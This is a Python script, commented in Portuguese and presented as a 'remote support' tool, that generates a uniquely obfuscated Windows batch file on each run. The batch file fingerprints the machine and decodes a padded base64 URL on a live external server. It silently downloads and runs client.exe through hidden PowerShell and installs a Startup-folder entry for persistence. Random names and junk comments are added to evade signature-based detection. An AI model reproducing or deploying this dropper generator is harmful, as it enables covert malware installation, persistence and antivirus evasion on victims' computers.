#!/usr/bin/env python3
"""
Gerador Polimórfico de BAT para Suporte Remoto
Cada arquivo gerado é ÚNICO com código diferente
Pastas e executáveis com nomes hash
"""

import base64
import uuid
import hashlib
import os
import random
import string
from datetime import datetime

# Configuração
SERVER_URL = "https://web-production-9d7cc.up.railway.app"
OUTPUT_DIR = "bats_gerados"


def random_var_name(length=8):
    """Gera nome de variável aleatório"""
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(length))


def random_hash_name(length=10):
    """Gera nome tipo hash (letras minúsculas + números)"""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


def random_comment():
    """Gera comentário aleatório"""
    words = ['Init', 'Core', 'Proc', 'Sys', 'Mod', 'Cfg', 'Chk', 'Ver', 'Hnd', 'Svc']
    return f"REM {random.choice(words)}{random.randint(100,999)}"


def generate_polymorphic_hwid_code():
    """Gera código polimórfico para HWID"""
    v1 = random_var_name()
    v2 = random_var_name()
    v3 = random_var_name()
    v4 = random_var_name()
    loop_vars = 'abcdefghijklmnopqrstuvwxyz'

    lv1 = random.choice(loop_vars)
    lv2 = random.choice(loop_vars)
    lv3 = random.choice(loop_vars)

    return f'''
{random_comment()}
for /f "tokens=2 delims==" %%{lv1} in ('wmic csproduct get uuid /value 2^>nul') do set "{v1}=%%{lv1}"
{random_comment()}
for /f "tokens=2 delims==" %%{lv2} in ('wmic nic where "NetEnabled=true" get MACAddress /value 2^>nul ^| find ":"') do set "{v2}=%%{lv2}"
set "{v3}=%{v1}%%{v2}%"
{random_comment()}
for /f %%{lv3} in ('powershell -c "[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%{v3}%'))).Replace('-','').Substring(0,16)"') do set "{v4}=%%{lv3}"
''', v4


def generate_unique_structure():
    """Gera estrutura única de código"""
    structures = [
        lambda url_var, dir_var, exe_name: f'''
if not exist "%{dir_var}%\\{exe_name}" (
    powershell -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%{url_var}%','%{dir_var}%\\{exe_name}')"
)
''',
        lambda url_var, dir_var, exe_name: f'''
if exist "%{dir_var}%\\{exe_name}" goto :r{random.randint(1000,9999)}
powershell -w hidden -c "$c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');[Net.ServicePointManager]::SecurityProtocol='Tls12';$c.DownloadFile('%{url_var}%','%{dir_var}%\\{exe_name}')"
:r{random.randint(1000,9999)}
''',
        lambda url_var, dir_var, exe_name: f'''
if exist "%{dir_var}%\\{exe_name}" goto :x{random.randint(1000,9999)}
powershell -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=3072;$w=New-Object Net.WebClient;$w.DownloadFile('%{url_var}%','%{dir_var}%\\{exe_name}')" 2>nul
:x{random.randint(1000,9999)}
'''
    ]
    return random.choice(structures)


def gerar_bat_polimorfico(nome_cliente=None, empresa=None):
    """Gera um BAT completamente único com nomes hash"""

    bat_id = str(uuid.uuid4()).upper()
    bat_hash = hashlib.sha256(bat_id.encode()).hexdigest()[:32].upper()
    unique_sig = hashlib.sha512((bat_id + str(datetime.now().timestamp())).encode()).hexdigest()[:64]

    folder_hash = random_hash_name(10)
    exe_hash = random_hash_name(10)

    var_bid = random_var_name()
    var_url = random_var_name()
    var_dir = random_var_name()
    var_dl = random_var_name()
    var_startup = random_var_name()

    url_exe = f"{SERVER_URL}/client.exe"
    url_encoded = base64.b64encode(url_exe.encode()).decode()

    padding = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 12)))
    url_with_padding = f"{padding}|{url_encoded}"

    hwid_code, hwid_var = generate_polymorphic_hwid_code()
    download_structure = generate_unique_structure()
    random_comments = '\n'.join([random_comment() for _ in range(random.randint(2, 5))])

    exe_name = f"{exe_hash}.exe"

    bat_content = f'''@echo off
{random_comment()}
setlocal EnableDelayedExpansion
{random_comments}

REM [{unique_sig[:32]}]

set "{var_bid}={bat_hash}"
set "{var_url}={url_with_padding}"

{hwid_code}

REM Pasta com nome hash de 10 caracteres
set "{var_dir}=%LOCALAPPDATA%\\{folder_hash}"
if not exist "%{var_dir}%" mkdir "%{var_dir}%"

{random_comment()}
echo %{var_bid}%> "%{var_dir}%\\.id"
echo %{hwid_var}%>> "%{var_dir}%\\.id"

{random_comment()}
for /f "tokens=2 delims=|" %%a in ("%{var_url}%") do set "{var_dl}=%%a"
for /f %%b in ('powershell -c "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%{var_dl}%'))"') do set "{var_url}=%%b"

{random_comment()}
{download_structure(var_url, var_dir, exe_name)}

{random_comment()}
set "{var_startup}=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
if not exist "%{var_startup}%\\{folder_hash[:6]}.bat" (
    echo @echo off> "%{var_startup}%\\{folder_hash[:6]}.bat"
    echo start "" /min "%{var_dir}%\\{exe_name}">> "%{var_startup}%\\{folder_hash[:6]}.bat"
)

{random_comment()}
start "" /min "%{var_dir}%\\{exe_name}"
exit /b 0

REM [{hashlib.sha256((bat_id + bat_hash).encode()).hexdigest()[:24].upper()}]
'''

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    if nome_cliente:
        safe_name = ''.join(c if c.isalnum() else '_' for c in nome_cliente)
        filename = f"support_{safe_name}_{bat_hash[:6]}_{timestamp[-6:]}.bat"
    else:
        filename = f"support_{bat_hash[:8]}_{timestamp[-6:]}.bat"

    filepath = os.path.join(OUTPUT_DIR, filename)

    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(bat_content)

    with open(filepath, 'rb') as f:
        file_hash = hashlib.sha256(f.read()).hexdigest()[:16].upper()

    print(f"")
    print(f"  ╔══════════════════════════════════════════════════╗")
    print(f"  ║       BAT POLIMÓRFICO GERADO COM SUCESSO         ║")
    print(f"  ╠══════════════════════════════════════════════════╣")
    print(f"  ║  Arquivo:    {filename[:38]:<38} ║")
    print(f"  ║  BAT-ID:     {bat_id[:36]:<36}   ║")
    print(f"  ║  File-Hash:  {file_hash:<36}   ║")
    print(f"  ╠══════════════════════════════════════════════════╣")
    print(f"  ║  Pasta Hash: {folder_hash:<36}   ║")
    print(f"  ║  EXE Hash:   {exe_hash}.exe{' '*26} ║")
    print(f"  ╚══════════════════════════════════════════════════╝")
    print(f"")

    return filepath, bat_id, bat_hash, file_hash, folder_hash, exe_hash


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        gerar_bat_polimorfico(sys.argv[1])
    else:
        gerar_bat_polimorfico()
